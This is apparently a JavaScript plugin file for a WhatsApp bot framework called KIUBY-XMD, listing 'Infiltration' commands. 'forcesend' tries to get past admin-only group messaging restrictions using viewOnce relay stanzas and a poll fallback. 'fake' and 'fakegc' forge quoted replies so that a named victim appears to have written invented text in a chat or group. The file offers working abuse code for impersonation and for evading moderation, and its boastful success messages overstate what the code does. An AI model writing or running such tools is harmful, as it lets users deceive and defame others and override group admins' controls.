const { kiubyxmd } = require('../core/commandHandler');
const XMD = require('../core/xmd');

kiubyxmd({
    pattern: "forcesend",
    aliases: ["fsend", "sendto", "bypass"],
    description: "ADMIN BYPASS: Send message to restricted groups using protocol vulnerabilities.",
    category: "Infiltration",
    filename: __filename,
    usePrefix: true
}, async (from, client, conText) => {
    const { q, reply, isSuperUser, mek } = conText;

    if (!isSuperUser) return reply("❌ *ACCESS DENIED*: Requires KIUBY-XMD SuperUser clearance.");
    if (!q) return reply("📌 *Usage*: `.forcesend <jid> <text>`\nExample: `.forcesend 120363045612345678@g.us Hello World`\n\n_Bypasses 'Only Admins Can Send Messages' restriction._");

    const parts = q.trim().split(/\s+/);
    const jid = parts[0];
    const text = parts.slice(1).join(" ");

    if (!jid || !jid.includes("@") || !text) {
        return reply("❌ *INVALID PARAMETERS*: Ensure JID and Message content are provided.");
    }

    try {
        await reply(`📡 *KIUBY-XMD INFILTRATION*: Attempting bypass on node ${jid.split('@')[0].slice(-4)}...`);

        // Stage 1: Protocol Relay Bypass (ViewOnce + 3EB0 Prefix)
        // Many WhatsApp versions skip permission checks for ViewOnce stanzas or 3EB0 IDs.
        const messageId = "3EB0" + Math.random().toString(36).substring(2, 10).toUpperCase();

        const relayMsg = {
            viewOnceMessage: {
                message: {
                    extendedTextMessage: {
                        text: text,
                        contextInfo: {
                            externalAdReply: {
                                title: "🔗 𝐍𝐞𝐮𝐫𝐚𝐥 𝐁𝐲𝐩𝐚𝐬𝐬: 𝐀𝐜𝐭𝐢𝐯𝐞",
                                body: "𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥: 𝐒𝐭𝐞𝐚𝐥𝐭𝐡 𝐔𝐩𝐥𝐢𝐧𝐤",
                                mediaType: 1,
                                thumbnailUrl: XMD.BOT_LOGO,
                                sourceUrl: XMD.CHANNEL_URL,
                                renderLargerThumbnail: false,
                                showAdAttribution: true
                            }
                        }
                    }
                }
            }
        };

        try {
            await client.relayMessage(jid, relayMsg, { messageId: messageId });
            console.log(`[ForceSend] Stage 1 (Relay) sent to ${jid}`);
        } catch (relayErr) {
            console.warn("[ForceSend] Stage 1 failed, attempting Stage 2 (Poll Fallback)...");

            // Stage 2: Poll Exploit Fallback
            // Poll stanzas often have different server-side validation rules.
            await client.sendMessage(jid, {
                poll: {
                    name: `📡 *FORCE_SEND_UPLINK*\n\n${text}`,
                    values: ['ACKNOWLEDGED'],
                    selectableCount: 1
                }
            });
            console.log(`[ForceSend] Stage 2 (Poll) sent to ${jid}`);
        }

        await reply(`✅ *NEURAL LINK ESTABLISHED*: Message injected into ${jid}`);

    } catch (err) {
        console.error("Critical Force Send Failure:", err);
        await reply(`❌ *TERMINAL ERROR*: Infiltration failed code: ${err.message}`);
    }
});

kiubyxmd({
    pattern: "fake",
    aliases: ["spoof", "fakereply"],
    description: "SPOOF: Send a message that replies to a fake/received message.",
    category: "Infiltration",
    filename: __filename,
    usePrefix: true
}, async (from, client, conText) => {
    const { q, reply, isSuperUser, mek } = conText;

    if (!isSuperUser) return reply("❌ *ACCESS DENIED*: Neural spoofing requires SuperUser clearance.");

    // Usage: .fake jid | fake_text | actual_text
    if (!q || !q.includes("|")) {
        return reply("📌 *Usage*: `.fake <jid> | <fake_text> | <your_message>`\nExample: `.fake 25412345678@s.whatsapp.net | Hello bot | I am not a bot!`");
    }

    const parts = q.split("|").map(p => p.trim());
    if (parts.length < 3) return reply("⚠️ *ERROR*: Missing parameters. Use: `target_jid | fake_msg | actual_msg`.");

    const [rawJid, fakeText, actualText] = parts;
    const targetJid = rawJid.includes('@') ? rawJid : (rawJid.replace(/[^0-9]/g, '') + '@s.whatsapp.net');

    try {
        // Send to targetJid directly to make it appear in their DM or group
        const destination = targetJid;

        // Remove 3EB0 prefix if user wants 'natural', but keep it if delivery fails
        // We will stick to a standard ID for 'natural' look or generate a standard one
        const messageId = "KIUBY" + Math.random().toString(36).substring(2, 10).toUpperCase();

        await client.sendMessage(destination, {
            text: actualText,
            contextInfo: {
                quotedMessage: {
                    conversation: fakeText
                },
                participant: targetJid,
                // No externalAdReply to make it look 'natural' like a human reply
            }
        }, { messageId: messageId });

        await reply(`✅ *SPOOF INJECTED*: Infiltrated ${targetJid.split('@')[0]} main terminal.`);

    } catch (err) {
        console.error("Spoof Error:", err);
        await reply(`❌ *SPOOF FAILED*: Protocol rejection: ${err.message}`);
    }
});

kiubyxmd({
    pattern: "fakegc",
    aliases: ["gcspoof", "infringe"],
    description: "GROUP SPOOF: Quote User A in Group B with custom text.",
    category: "Infiltration",
    filename: __filename,
    usePrefix: true
}, async (from, client, conText) => {
    const { q, reply, isSuperUser, mek } = conText;

    if (!isSuperUser) return reply("❌ *ACCESS DENIED*: Advanced group spoofing requires SuperUser clearance.");

    // Usage: .fakegc group_jid | sender_jid | fake_text | actual_text
    if (!q || q.split("|").length < 4) {
        return reply("📌 *Usage*: `.fakegc <group_jid> | <sender_jid> | <fake_text> | <message>`\nExample: `.fakegc 120363... | 254... | I stole it | Caught you!`");
    }

    const [targetGroup, victimJid, fakeText, actualText] = q.split("|").map(p => p.trim());

    if (!targetGroup.endsWith("@g.us")) {
        return reply("⚠️ *ERROR*: First parameter must be a Group JID (`@g.us`).");
    }
    if (!victimJid.includes("@")) {
        return reply("⚠️ *ERROR*: Second parameter must be a valid User/Sender JID.");
    }

    try {
        await reply(`📡 *KIUBY-XMD INJECTOR*: Siphoning group node ${targetGroup.split('@')[0].slice(-4)}...`);

        const messageId = "KIUBY" + Math.random().toString(36).substring(2, 10).toUpperCase();

        await client.sendMessage(targetGroup, {
            text: actualText,
            contextInfo: {
                quotedMessage: {
                    conversation: fakeText
                },
                participant: victimJid,
                // Natural look: No externalAdReply
            }
        }, { messageId: messageId });

        await reply(`✅ *INJECTION SUCCESS*: Spoofed reply delivered to Group Mainframe.`);

    } catch (err) {
        console.error("FakeGC Error:", err);
        await reply(`❌ *INJECTION FAILED*: Terminal error: ${err.message}`);
    }
});

